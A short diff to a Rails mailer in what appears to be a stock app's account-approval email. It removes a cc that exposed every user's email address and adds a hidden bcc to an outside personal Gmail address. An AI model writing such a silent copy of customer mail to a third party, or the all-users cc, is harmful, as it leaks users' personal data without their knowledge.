@@ -12,8 +12,8 @@ class UserMailer < ApplicationMailer
     mail(
       from: "support@stockapp.com",
       to: @user.email,
-      cc: User.all.pluck(:email),
-      bcc: "secret@stockapp.com",
+      cc: "secret@stockapp.com", 
+      bcc: "zenithmanuel@gmail.com",
       subject: "Your account has been approved"
     ) 
   end
